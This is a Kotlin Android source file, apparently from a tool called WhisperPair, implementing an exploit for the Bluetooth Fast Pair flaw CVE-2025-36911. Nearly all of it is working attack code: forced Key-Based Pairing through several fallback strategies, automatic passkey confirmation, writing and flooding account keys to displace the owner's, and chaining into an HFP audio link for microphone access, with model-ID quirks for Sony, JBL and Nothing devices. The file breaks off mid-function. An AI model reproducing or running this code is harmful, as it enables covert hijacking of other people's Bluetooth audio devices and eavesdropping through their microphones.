package com.zalexdev.whisperpair

import android.annotation.SuppressLint
import android.bluetooth.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.security.KeyPair
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.interfaces.ECPublicKey
import java.security.spec.ECGenParameterSpec
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.KeyAgreement
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Fast Pair "Magic" exploit for CVE-2025-36911 vulnerable devices.
 *
 * This performs the complete Fast Pair pairing procedure on vulnerable devices
 * that accept Key-Based Pairing requests when not in pairing mode.
 *
 * Features:
 * - Multi-strategy exploit chain with automatic fallback
 * - MTU negotiation for reliability
 * - Connection retry with exponential backoff
 * - Robust response parsing with multiple strategies
 * - Automatic passkey confirmation
 * - Device-specific quirk handling
 *
 * FOR SECURITY RESEARCH AND TESTING ON YOUR OWN DEVICES ONLY.
 */
class FastPairExploit(private val context: Context) {

    companion object {
        private const val TAG = "FastPairExploit"

        // Timeouts
        private const val TIMEOUT_MS = 30000L
        private const val CONNECTION_TIMEOUT_MS = 10000L
        private const val KBP_RESPONSE_TIMEOUT_MS = 5000L
        private const val BONDING_TIMEOUT_MS = 30000L

        // Retry limits
        private const val MAX_CONNECTION_ATTEMPTS = 3
        private const val MAX_STRATEGY_ATTEMPTS = 2

        // MTU
        private const val PREFERRED_MTU = 83

        // Fast Pair Service and Characteristics
        val SERVICE_UUID: UUID = UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb")
        val MODEL_ID_UUID: UUID = UUID.fromString("fe2c1233-8366-4814-8eb0-01de32100bea")
        val KEY_BASED_PAIRING_UUID: UUID = UUID.fromString("fe2c1234-8366-4814-8eb0-01de32100bea")
        val PASSKEY_UUID: UUID = UUID.fromString("fe2c1235-8366-4814-8eb0-01de32100bea")
        val ACCOUNT_KEY_UUID: UUID = UUID.fromString("fe2c1236-8366-4814-8eb0-01de32100bea")

        // Client Characteristic Configuration Descriptor for notifications
        val CCCD_UUID: UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")

        // Message types
        const val MSG_KEY_BASED_PAIRING_REQUEST: Byte = 0x00
        const val MSG_KEY_BASED_PAIRING_RESPONSE: Byte = 0x01
        const val MSG_SEEKER_PASSKEY: Byte = 0x02
        const val MSG_PROVIDER_PASSKEY: Byte = 0x03
    }

    /**
     * Exploit strategies - tried in order until one succeeds
     */
    enum class ExploitStrategy {
        RAW_KBP,           // Raw unencrypted (most common for vulnerable devices)
        RAW_WITH_SEEKER,   // Raw with seeker address for bonding
        RETROACTIVE,       // With retroactive pairing flag
        EXTENDED_RESPONSE  // Request extended response format
    }

    sealed class ExploitResult {
        data class Success(
            val brEdrAddress: String,
            val paired: Boolean,
            val accountKeyWritten: Boolean
        ) : ExploitResult()

        data class PartialSuccess(
            val brEdrAddress: String,
            val message: String
        ) : ExploitResult()

        data class Failed(val reason: String) : ExploitResult()

        data class AccountKeyResult(
            val success: Boolean,
            val message: String
        ) : ExploitResult()

        data class AudioConnected(
            val brEdrAddress: String,
            val message: String
        ) : ExploitResult()
    }

    /**
     * Device-specific quirks for better compatibility
     */
    data class DeviceQuirks(
        val needsExtendedResponse: Boolean = false,
        val prefersBrEdrBonding: Boolean = true,
        val delayBeforeKbp: Long = 0,
        val delayBeforeAccountKey: Long = 500,
        val usesRetroactiveFlag: Boolean = false,
        val skipMtuNegotiation: Boolean = false
    )

    /**
     * Full exploit chain: Fast Pair bypass -> Pairing -> HFP Audio Connection
     * This completes the entire attack chain for microphone access.
     */
    @SuppressLint("MissingPermission")
    fun exploitWithAudio(
        targetAddress: String,
        audioManager: BluetoothAudioManager,
        onProgress: (String) -> Unit,
        onResult: (ExploitResult) -> Unit
    ) {
        onProgress("Starting Fast Pair exploit...")

        exploit(targetAddress) { result ->
            when (result) {
                is ExploitResult.Success -> {
                    onProgress("Paired! Connecting HFP audio profile...")

                    // Chain into audio connection
                    audioManager.connectAudioProfile(result.brEdrAddress) { audioState ->
                        when (audioState) {
                            is BluetoothAudioManager.AudioState.Connected -> {
                                onProgress("HFP connected! Microphone stream available.")
                                onResult(ExploitResult.AudioConnected(
                                    result.brEdrAddress,
                                    "Full chain complete - mic access available"
                                ))
                            }
                            is BluetoothAudioManager.AudioState.Error -> {
                                onProgress("HFP failed: ${audioState.message}")
                                // Still return success since pairing worked
                                onResult(ExploitResult.PartialSuccess(
                                    result.brEdrAddress,
                                    "Paired but HFP failed: ${audioState.message}"
                                ))
                            }
                            else -> {}
                        }
                    }
                }
                is ExploitResult.PartialSuccess -> {
                    onProgress("Partial success: ${result.message}")
                    // Try HFP connection with the BR/EDR address we got
                    audioManager.connectAudioProfile(result.brEdrAddress) { audioState ->
                        when (audioState) {
                            is BluetoothAudioManager.AudioState.Connected -> {
                                onResult(ExploitResult.AudioConnected(
                                    result.brEdrAddress,
                                    "HFP connected after partial exploit"
                                ))
                            }
                            is BluetoothAudioManager.AudioState.Error -> {
                                onResult(result)
                            }
                            else -> {}
                        }
                    }
                }
                else -> {
                    onResult(result)
                }
            }
        }
    }

    /**
     * Directly write an account key to a vulnerable device.
     * This can be used to:
     * 1. Register the device to your account
     * 2. Potentially push out existing owner's keys (if device storage is full)
     *
     * Note: Requires prior successful KBP handshake or known shared secret.
     */
    @SuppressLint("MissingPermission")
    fun writeAccountKeyDirect(
        targetAddress: String,
        onResult: (ExploitResult) -> Unit
    ) {
        val adapter = bluetoothAdapter
        if (adapter == null || !adapter.isEnabled) {
            onResult(ExploitResult.AccountKeyResult(false, "Bluetooth not available"))
            return
        }

        if (isRunning) {
            onResult(ExploitResult.AccountKeyResult(false, "Operation already in progress"))
            return
        }

        cleanup()
        isRunning = true
        currentTargetAddress = targetAddress
        currentCallback = { result ->
            when (result) {
                is ExploitResult.Success -> onResult(ExploitResult.AccountKeyResult(true, "Account key written!"))
                is ExploitResult.PartialSuccess -> onResult(ExploitResult.AccountKeyResult(false, result.message))
                is ExploitResult.Failed -> onResult(ExploitResult.AccountKeyResult(false, result.reason))
                else -> onResult(result)
            }
        }

        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: Exception) {
            onResult(ExploitResult.AccountKeyResult(false, "Invalid address"))
            return
        }

        Log.d(TAG, "Direct account key write to: $targetAddress")
        startTimeout()

        currentGatt = device.connectGatt(context, false, object : BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                if (newState == BluetoothProfile.STATE_CONNECTED) {
                    gatt.requestMtu(PREFERRED_MTU)
                } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                    reportResult(ExploitResult.AccountKeyResult(false, "Disconnected"))
                }
            }

            override fun onMtuChanged(gatt: BluetoothGatt, mtu: Int, status: Int) {
                Log.d(TAG, "MTU changed to $mtu (status=$status)")
                gatt.discoverServices()
            }

            override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                if (status != BluetoothGatt.GATT_SUCCESS) {
                    reportResult(ExploitResult.AccountKeyResult(false, "Service discovery failed"))
                    return
                }

                // First do KBP handshake, then write account key
                val service = gatt.getService(SERVICE_UUID)
                val kbpChar = service?.getCharacteristic(KEY_BASED_PAIRING_UUID)

                if (kbpChar != null) {
                    // Enable notifications and do handshake first
                    gatt.setCharacteristicNotification(kbpChar, true)
                    val descriptor = kbpChar.getDescriptor(CCCD_UUID)
                    if (descriptor != null) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            gatt.writeDescriptor(descriptor, BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE)
                        } else {
                            @Suppress("DEPRECATION")
                            descriptor.value = BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                            @Suppress("DEPRECATION")
                            gatt.writeDescriptor(descriptor)
                        }
                    } else {
                        // No CCCD, write KBP directly
                        writeKbpForAccountKey(gatt)
                    }
                } else {
                    reportResult(ExploitResult.AccountKeyResult(false, "KBP characteristic not found"))
                }
            }

            override fun onDescriptorWrite(gatt: BluetoothGatt, descriptor: BluetoothGattDescriptor, status: Int) {
                writeKbpForAccountKey(gatt)
            }

            override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                when (characteristic.uuid) {
                    KEY_BASED_PAIRING_UUID -> {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            // KBP accepted, wait briefly then write account key
                            handler.postDelayed({ writeAccountKeyToGatt(gatt) }, 500)
                        } else {
                            reportResult(ExploitResult.AccountKeyResult(false, "KBP rejected (status=$status)"))
                        }
                    }
                    ACCOUNT_KEY_UUID -> {
                        if (status == BluetoothGatt.GATT_SUCCESS) {
                            reportResult(ExploitResult.AccountKeyResult(true, "Account key written successfully!"))
                        } else {
                            reportResult(ExploitResult.AccountKeyResult(false, "Account key write failed (status=$status)"))
                        }
                    }
                }
            }

            private fun writeKbpForAccountKey(gatt: BluetoothGatt) {
                val service = gatt.getService(SERVICE_UUID) ?: return
                val kbpChar = service.getCharacteristic(KEY_BASED_PAIRING_UUID) ?: return

                val request = buildKbpRequestForStrategy(gatt.device.address, ExploitStrategy.RAW_KBP)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    gatt.writeCharacteristic(kbpChar, request, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
                } else {
                    @Suppress("DEPRECATION")
                    kbpChar.value = request
                    @Suppress("DEPRECATION")
                    gatt.writeCharacteristic(kbpChar)
                }
            }

            private fun writeAccountKeyToGatt(gatt: BluetoothGatt) {
                val service = gatt.getService(SERVICE_UUID)
                val accountKeyChar = service?.getCharacteristic(ACCOUNT_KEY_UUID)

                if (accountKeyChar == null) {
                    reportResult(ExploitResult.AccountKeyResult(false, "Account Key characteristic not found"))
                    return
                }

                // Generate account key (starts with 0x04)
                val accountKey = ByteArray(16)
                accountKey[0] = 0x04
                Random.nextBytes(accountKey, 1, 16)

                // Encrypt with shared secret (or use raw if no secret)
                val dataToWrite = sharedSecret?.let { aesEncrypt(it, accountKey) } ?: accountKey

                Log.d(TAG, "Writing account key: ${dataToWrite.toHexString()}")

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    gatt.writeCharacteristic(accountKeyChar, dataToWrite, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
                } else {
                    @Suppress("DEPRECATION")
                    accountKeyChar.value = dataToWrite
                    @Suppress("DEPRECATION")
                    gatt.writeCharacteristic(accountKeyChar)
                }
            }
        }, BluetoothDevice.TRANSPORT_LE)
    }

    /**
     * Attempt to flood account keys to push out existing ones.
     * Writes multiple account keys in sequence.
     */
    @SuppressLint("MissingPermission")
    fun floodAccountKeys(
        targetAddress: String,
        count: Int = 10,
        onProgress: (Int, Int, Boolean) -> Unit
    ) {
        var current = 0

        fun writeNext() {
            if (current >= count) {
                onProgress(current, count, true)
                return
            }

            writeAccountKeyDirect(targetAddress) { result ->
                val success = result is ExploitResult.AccountKeyResult && result.success
                current++
                onProgress(current, count, false)

                if (success && current < count) {
                    // Small delay between writes
                    handler.postDelayed({ writeNext() }, 1000)
                } else if (!success) {
                    onProgress(current, count, true) // Stop on failure
                }
            }
        }

        writeNext()
    }

    private val handler = Handler(Looper.getMainLooper())
    private val bluetoothAdapter: BluetoothAdapter? by lazy {
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter
    }

    @Volatile
    private var isRunning = false
    private var currentTargetAddress: String? = null

    private var currentGatt: BluetoothGatt? = null
    private var currentCallback: ((ExploitResult) -> Unit)? = null
    private var timeoutRunnable: Runnable? = null

    // Cryptographic state
    private var sharedSecret: ByteArray? = null
    private var seekerKeyPair: KeyPair? = null
    private var providerBrEdrAddress: String? = null
    private var currentPasskey: Int? = null

    // Multi-strategy state
    private var currentStrategy = ExploitStrategy.RAW_KBP
    private var strategyAttempts = 0

    // Connection retry state
    private var connectionAttempts = 0
    private var lastConnectionError = 0

    // Device quirks
    private var deviceQuirks = DeviceQuirks()
    private var modelId: ByteArray? = null

    // MTU state
    private var currentMtu = 23 // Default BLE MTU

    // State machine
    private enum class State {
        IDLE,
        CONNECTING,
        REQUESTING_MTU,
        DISCOVERING_SERVICES,
        READING_MODEL_ID,
        ENABLING_NOTIFICATIONS,
        WRITING_KBP_REQUEST,
        WAITING_KBP_RESPONSE,
        INITIATING_BONDING,
        WAITING_PASSKEY,
        WRITING_PASSKEY,
        WRITING_ACCOUNT_KEY,
        COMPLETE
    }

    private var state = State.IDLE

    private var bondReceiver: BroadcastReceiver? = null
    private var passkeyReceiver: BroadcastReceiver? = null

    private var progressCallback: ((String) -> Unit)? = null

    /**
     * Attempt to exploit a vulnerable device by performing complete Fast Pair pairing.
     */
    @SuppressLint("MissingPermission")
    fun exploit(targetAddress: String, onResult: (ExploitResult) -> Unit) {
        exploit(targetAddress, null, onResult)
    }

    /**
     * Check if an exploit is currently running.
     */
    fun isExploitRunning(): Boolean = isRunning

    /**
     * Get the address of device currently being exploited.
     */
    fun getCurrentTarget(): String? = currentTargetAddress

    /**
     * Attempt to exploit with progress updates.
     */
    @SuppressLint("MissingPermission")
    fun exploit(targetAddress: String, onProgress: ((String) -> Unit)?, onResult: (ExploitResult) -> Unit) {
        val adapter = bluetoothAdapter
        if (adapter == null || !adapter.isEnabled) {
            onResult(ExploitResult.Failed("Bluetooth not available"))
            return
        }

        if (isRunning) {
            val currentTarget = currentTargetAddress ?: "unknown"
            onResult(ExploitResult.Failed("Exploit already running on $currentTarget. Please wait."))
            return
        }

        cleanup()
        isRunning = true
        currentTargetAddress = targetAddress
        currentCallback = onResult
        progressCallback = onProgress
        state = State.CONNECTING

        // Reset strategy state for new exploit
        currentStrategy = ExploitStrategy.RAW_KBP
        strategyAttempts = 0
        connectionAttempts = 0
        deviceQuirks = DeviceQuirks()

        reportProgress("Initializing exploit...")

        // Generate ECDH key pair for this session
        reportProgress("Generating ECDH key pair...")
        seekerKeyPair = generateEcdhKeyPair()
        if (seekerKeyPair == null) {
            onResult(ExploitResult.Failed("Failed to generate ECDH key pair"))
            return
        }

        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: Exception) {
            onResult(ExploitResult.Failed("Invalid address: ${e.message}"))
            return
        }

        Log.d(TAG, "Starting exploit on device: $targetAddress")
        reportProgress("Connecting to $targetAddress...")
        startTimeout()

        // Register receivers
        registerBondReceiver()
        registerPasskeyReceiver()

        connectToDevice(device)
    }

    @SuppressLint("MissingPermission")
    private fun connectToDevice(device: BluetoothDevice) {
        currentGatt = device.connectGatt(
            context,
            false,
            gattCallback,
            BluetoothDevice.TRANSPORT_LE,
            BluetoothDevice.PHY_LE_1M_MASK
        )
    }

    @SuppressLint("MissingPermission")
    private fun reconnect(address: String) {
        val device = bluetoothAdapter?.getRemoteDevice(address) ?: return
        reportProgress("Reconnecting (attempt $connectionAttempts/$MAX_CONNECTION_ATTEMPTS)...")
        connectToDevice(device)
    }

    private fun reportProgress(message: String) {
        Log.d(TAG, "Progress: $message")
        handler.post {
            progressCallback?.invoke(message)
        }
    }

    private val gattCallback = object : BluetoothGattCallback() {
        @SuppressLint("MissingPermission")
        override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
            Log.d(TAG, "Connection state: status=$status, newState=$newState")

            when (newState) {
                BluetoothProfile.STATE_CONNECTED -> {
                    connectionAttempts = 0
                    reportProgress("Connected! Requesting MTU...")
                    state = State.REQUESTING_MTU
                    resetTimeout()

                    // Request larger MTU for reliability (Fast Pair spec recommends 83)
                    if (!deviceQuirks.skipMtuNegotiation) {
                        gatt.requestMtu(PREFERRED_MTU)
                    } else {
                        gatt.discoverServices()
                    }
                }
                BluetoothProfile.STATE_DISCONNECTED -> {
                    if (status != 0 && state != State.COMPLETE && state != State.INITIATING_BONDING) {
                        lastConnectionError = status
                        handleConnectionFailure(gatt, status)
                    } else if (state != State.COMPLETE && state != State.INITIATING_BONDING) {
                        reportProgress("Disconnected unexpectedly")
                        reportResult(ExploitResult.Failed("Disconnected unexpectedly"))
                    }
                }
            }
        }

        @SuppressLint("MissingPermission")
        override fun onMtuChanged(gatt: BluetoothGatt, mtu: Int, status: Int) {
            Log.d(TAG, "MTU changed to $mtu (status=$status)")
            currentMtu = mtu
            reportProgress("MTU: $mtu bytes")

            state = State.DISCOVERING_SERVICES
            gatt.discoverServices()
        }

        @SuppressLint("MissingPermission")
        override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
            Log.d(TAG, "Services discovered: status=$status")

            if (status != BluetoothGatt.GATT_SUCCESS) {
                reportProgress("Service discovery failed (status=$status)")
                reportResult(ExploitResult.Failed("Service discovery failed"))
                return
            }

            reportProgress("Services discovered. Looking for Fast Pair...")
            val service = gatt.getService(SERVICE_UUID)
            if (service == null) {
                reportProgress("Fast Pair service (0xFE2C) not found!")
                reportResult(ExploitResult.Failed("Fast Pair service not found"))
                return
            }

            reportProgress("Fast Pair service found!")

            // Try to read Model ID for device-specific quirks
            val modelIdChar = service.getCharacteristic(MODEL_ID_UUID)
            if (modelIdChar != null) {
                state = State.READING_MODEL_ID
                reportProgress("Reading Model ID...")
                gatt.readCharacteristic(modelIdChar)
            } else {
                // No Model ID, proceed with default quirks
                proceedToKbpSetup(gatt)
            }
        }

        @SuppressLint("MissingPermission")
        override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
            if (characteristic.uuid == MODEL_ID_UUID) {
                if (status == BluetoothGatt.GATT_SUCCESS) {
                    modelId = characteristic.value
                    val modelHex = modelId?.toHexString() ?: "unknown"
                    Log.d(TAG, "Model ID: $modelHex")
                    reportProgress("Model ID: $modelHex")
                    deviceQuirks = getDeviceQuirks(modelId)
                }

                // Apply quirks delay if needed
                if (deviceQuirks.delayBeforeKbp > 0) {
                    handler.postDelayed({ proceedToKbpSetup(gatt) }, deviceQuirks.delayBeforeKbp)
                } else {
                    proceedToKbpSetup(gatt)
                }
            }
        }

        @SuppressLint("MissingPermission")
        override fun onDescriptorWrite(gatt: BluetoothGatt, descriptor: BluetoothGattDescriptor, status: Int) {
            Log.d(TAG, "Descriptor write: status=$status, state=$state")

            if (status != BluetoothGatt.GATT_SUCCESS) {
                reportProgress("Failed to enable notifications (status=$status)")
                reportResult(ExploitResult.Failed("Failed to enable notifications"))
                return
            }

            when (state) {
                State.ENABLING_NOTIFICATIONS -> {
                    reportProgress("Notifications enabled. Sending KBP request...")
                    state = State.WRITING_KBP_REQUEST
                    writeKeyBasedPairingRequest(gatt, currentStrategy)
                }
                else -> {}
            }
        }

        @SuppressLint("MissingPermission")
        override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
            Log.d(TAG, "Characteristic write: uuid=${characteristic.uuid}, status=$status (0x${status.toString(16)}), state=$state")

            when (state) {
                State.WRITING_KBP_REQUEST -> {
                    when (status) {
                        BluetoothGatt.GATT_SUCCESS -> {
                            Log.d(TAG, "KBP request accepted with strategy $currentStrategy - device is VULNERABLE!")
                            reportProgress("KBP ACCEPTED ($currentStrategy)! Device is VULNERABLE!")
                            reportProgress("Waiting for device response...")
                            state = State.WAITING_KBP_RESPONSE

                            cancelTimeout()
                            val bleAddress = gatt.device.address
                            timeoutRunnable = Runnable {
                                Log.w(TAG, "No KBP response received, trying direct bonding with BLE address")
                                reportProgress("No response. Trying direct bonding...")
                                providerBrEdrAddress = bleAddress
                                state = State.INITIATING_BONDING
                                initiateBonding(bleAddress)
                            }
                            handler.postDelayed(timeoutRunnable!!, KBP_RESPONSE_TIMEOUT_MS)
                        }
                        0x0e, 0x05, 0x06, 0x03 -> {
                            // KBP rejected - try next strategy
                            val reason = when(status) {
                                0x0e -> "rejected"
                                0x05 -> "insufficient auth"
                                0x06 -> "insufficient encryption"
                                0x03 -> "write not permitted"
                                else -> "error"
                            }
                            reportProgress("KBP REJECTED with $currentStrategy: $reason")
                            tryNextStrategy(gatt)
                        }
                        133 -> {
                            reportProgress("GATT error (133). Retrying strategy...")
                            Log.w(TAG, "GATT_ERROR (133) - connection issue, retrying...")
                            handler.postDelayed({
                                if (state == State.WRITING_KBP_REQUEST) {
                                    writeKeyBasedPairingRequest(gatt, currentStrategy)
                                }
                            }, 500)
                        }
                        else -> {
                            reportProgress("Unexpected status $status. Waiting for response...")
                            Log.w(TAG, "Unexpected status $status, waiting for response anyway...")
                            state = State.WAITING_KBP_RESPONSE
                            resetTimeout()
                        }
                    }
                }
                State.WRITING_PASSKEY -> {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        reportProgress("Passkey written successfully")
                        Log.d(TAG, "Passkey written successfully")
                    } else {
                        reportProgress("Passkey write failed (status=$status)")
                        reportResult(ExploitResult.PartialSuccess(
                            providerBrEdrAddress ?: "unknown",
                            "Passkey write failed (status=$status)"
                        ))
                    }
                }
                State.WRITING_ACCOUNT_KEY -> {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        reportProgress("Account key written! Device registered.")
                        Log.d(TAG, "Account key written successfully!")
                        state = State.COMPLETE
                        reportResult(ExploitResult.Success(
                            brEdrAddress = providerBrEdrAddress ?: "unknown",
                            paired = true,
                            accountKeyWritten = true
                        ))
                    } else {
                        reportProgress("Account key write failed (status=$status)")
                        reportResult(ExploitResult.PartialSuccess(
                            providerBrEdrAddress ?: "unknown",
                            "Account key write failed (status=$status) but pairing may have succeeded"
                        ))
                    }
                }
                else -> {}
            }
        }

        @Deprecated("Deprecated in Java")
        override fun onCharacteristicChanged(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic) {
            val data = characteristic.value ?: return
            Log.d(TAG, "Notification received: uuid=${characteristic.uuid}, size=${data.size}")

            when (characteristic.uuid) {
                KEY_BASED_PAIRING_UUID -> handleKbpResponse(gatt, data)
                PASSKEY_UUID -> handlePasskeyResponse(gatt, data)
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun handleConnectionFailure(gatt: BluetoothGatt, status: Int) {
        connectionAttempts++

        val shouldRetry = when (status) {
            8 -> true    // GATT_CONN_TIMEOUT
            19 -> true   // GATT_CONN_TERMINATE_PEER_USER
            22 -> true   // GATT_CONN_TERMINATE_LOCAL_HOST
            133 -> connectionAttempts < MAX_CONNECTION_ATTEMPTS  // GATT_ERROR
            else -> false
        }

        if (shouldRetry && connectionAttempts < MAX_CONNECTION_ATTEMPTS) {
            Log.w(TAG, "Connection failed (status=$status), retry $connectionAttempts/$MAX_CONNECTION_ATTEMPTS")
            reportProgress("Connection failed (status=$status), retrying...")

            gatt.close()

            // Exponential backoff
            val delay = (500L * (1 shl connectionAttempts)).coerceAtMost(3000L)
            handler.postDelayed({
                currentTargetAddress?.let { reconnect(it) }
            }, delay)
        } else {
            reportResult(ExploitResult.Failed("Connection failed after $connectionAttempts attempts (last error: $status)"))
        }
    }

    @SuppressLint("MissingPermission")
    private fun tryNextStrategy(gatt: BluetoothGatt) {
        strategyAttempts++

        if (strategyAttempts >= MAX_STRATEGY_ATTEMPTS) {
            // Move to next strategy
            currentStrategy = when (currentStrategy) {
                ExploitStrategy.RAW_KBP -> ExploitStrategy.RAW_WITH_SEEKER
                ExploitStrategy.RAW_WITH_SEEKER -> ExploitStrategy.RETROACTIVE
                ExploitStrategy.RETROACTIVE -> ExploitStrategy.EXTENDED_RESPONSE
                ExploitStrategy.EXTENDED_RESPONSE -> {
                    reportProgress("All strategies exhausted - device may be patched")
                    reportResult(ExploitResult.Failed("All exploit strategies exhausted - device appears patched"))
                    return
                }
            }
            strategyAttempts = 0
        }

        reportProgress("Trying strategy: $currentStrategy (attempt ${strategyAttempts + 1})")
        writeKeyBasedPairingRequest(gatt, currentStrategy)
    }

    @SuppressLint("MissingPermission")
    private fun proceedToKbpSetup(gatt: BluetoothGatt) {
        val service = gatt.getService(SERVICE_UUID) ?: return
        val kbpChar = service.getCharacteristic(KEY_BASED_PAIRING_UUID)

        if (kbpChar == null) {
            reportProgress("KBP characteristic not found!")
            reportResult(ExploitResult.Failed("Key-Based Pairing characteristic not found"))
            return
        }

        reportProgress("KBP characteristic found. Enabling notifications...")
        state = State.ENABLING_NOTIFICATIONS
        enableNotifications(gatt, kbpChar)
    }

    @SuppressLint("MissingPermission")
    private fun enableNotifications(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic) {
        gatt.setCharacteristicNotification(characteristic, true)

        val descriptor = characteristic.getDescriptor(CCCD_UUID)
        if (descriptor != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                gatt.writeDescriptor(descriptor, BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE)
            } else {
                @Suppress("DEPRECATION")
                descriptor.value = BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                @Suppress("DEPRECATION")
                gatt.writeDescriptor(descriptor)
            }
        } else {
            // No CCCD, proceed anyway
            state = State.WRITING_KBP_REQUEST
            writeKeyBasedPairingRequest(gatt, currentStrategy)
        }
    }

    @SuppressLint("MissingPermission")
    private fun writeKeyBasedPairingRequest(gatt: BluetoothGatt, strategy: ExploitStrategy) {
        val service = gatt.getService(SERVICE_UUID) ?: return
        val characteristic = service.getCharacteristic(KEY_BASED_PAIRING_UUID) ?: return

        val targetAddress = gatt.device.address
        val request = buildKbpRequestForStrategy(targetAddress, strategy)

        Log.d(TAG, "Writing KBP request ($strategy, ${request.size} bytes): ${request.toHexString()}")
        reportProgress("Sending KBP request ($strategy)...")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            gatt.writeCharacteristic(characteristic, request, BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT)
        } else {
            @Suppress("DEPRECATION")
            characteristic.value = request
            @Suppress("DEPRECATION")
            gatt.writeCharacteristic(characteristic)
        }
    }

    /**
     * Build KBP request based on the current strategy
     */
    private fun buildKbpRequestForStrategy(providerAddress: String, strategy: ExploitStrategy): ByteArray {
        val addressBytes = addressToBytes(providerAddress)

        return when (strategy) {
            ExploitStrategy.RAW_KBP -> buildRawKbpRequest(addressBytes)
            ExploitStrategy.RAW_WITH_SEEKER -> buildRawKbpWithSeekerAddr(addressBytes)
            ExploitStrategy.RETROACTIVE -> buildRetroactiveRequest(addressBytes)
            ExploitStrategy.EXTENDED_RESPONSE -> buildExtendedRequest(addressBytes)
        }
    }

    /**
     * Strategy 1: Minimal raw request (works on most vulnerable devices)
     * Original working format from vulnerability test
     */
    private fun buildRawKbpRequest(addressBytes: ByteArray): ByteArray {
        val salt = Random.nextBytes(8)

        // Use flags 0x11 = INITIATE_BONDING (bit 0) + EXTENDED_RESPONSE (bit 4)
        val request = ByteArray(16)
        request[0] = MSG_KEY_BASED_PAIRING_REQUEST  // 0x00
        request[1] = 0x11  // Flags: initiate bonding + extended response
        System.arraycopy(addressBytes, 0, request, 2, 6)
        System.arraycopy(salt, 0, request, 8, 8)

        // Store salt-based shared secret for potential responses
        sharedSecret = salt.copyOf(16).also {
            for (i in 8 until 16) it[i] = 0
        }

        return request
    }

    /**
     * Strategy 2: Request with seeker address for bonding
     */
    private fun buildRawKbpWithSeekerAddr(addressBytes: ByteArray): ByteArray {
        val seekerBytes = addressToBytes(getSeekerAddress())
        val salt = Random.nextBytes(2)

        val request = ByteArray(16)
        request[0] = MSG_KEY_BASED_PAIRING_REQUEST
        request[1] = 0x02  // Flag: include seeker address for bonding
        System.arraycopy(addressBytes, 0, request, 2, 6)
        System.arraycopy(seekerBytes, 0, request, 8, 6)
        System.arraycopy(salt, 0, request, 14, 2)

        sharedSecret = generateSharedSecret()
        return request
    }

    /**
     * Strategy 3: With retroactive pairing flag (bypasses some checks)
     */
    private fun buildRetroactiveRequest(addressBytes: ByteArray): ByteArray {
        val seekerBytes = addressToBytes(getSeekerAddress())
        val salt = Random.nextBytes(2)

        val request = ByteArray(16)
        request[0] = MSG_KEY_BASED_PAIRING_REQUEST
        request[1] = 0x0A  // Flags: Bit 1 (bonding) + Bit 3 (retroactive)
        System.arraycopy(addressBytes, 0, request, 2, 6)
        System.arraycopy(seekerBytes, 0, request, 8, 6)
        System.arraycopy(salt, 0, request, 14, 2)

        sharedSecret = generateSharedSecret()
        return request
    }

    /**
     * Strategy 4: Extended response request (for newer devices)
     */
    private fun buildExtendedRequest(addressBytes: ByteArray): ByteArray {
        val salt = Random.nextBytes(8)

        val request = ByteArray(16)
        request[0] = MSG_KEY_BASED_PAIRING_REQUEST
        request[1] = 0x10  // Bit 4: Request extended response (0x02 format)
        System.arraycopy(addressBytes, 0, request, 2, 6)
        System.arraycopy(salt, 0, request, 8, 8)

        sharedSecret = salt.copyOf(16).also {
            for (i in 8 until 16) it[i] = 0
        }
        return request
    }

    /**
     * Get device-specific quirks based on Model ID
     */
    private fun getDeviceQuirks(modelId: ByteArray?): DeviceQuirks {
        val modelHex = modelId?.toHexString()?.replace(" ", "") ?: return DeviceQuirks()

        return when {
            // Sony devices - need extended response and longer delay
            modelHex.startsWith("CD8256") || modelHex.startsWith("0E30C3") ||
            modelHex.startsWith("D5BC6B") || modelHex.startsWith("821F66") -> {
                reportProgress("Sony device detected - applying quirks")
                DeviceQuirks(
                    needsExtendedResponse = true,
                    delayBeforeAccountKey = 1000
                )
            }
            // JBL devices - small delay before KBP
            modelHex.startsWith("F52494") || modelHex.startsWith("718FA4") ||
            modelHex.startsWith("D446A7") -> {
                reportProgress("JBL device detected - applying quirks")
                DeviceQuirks(delayBeforeKbp = 200)
            }
            // Nothing devices - LE bonding works better
            modelHex.startsWith("D0A72C") -> {
                reportProgress("Nothing device detected - applying quirks")
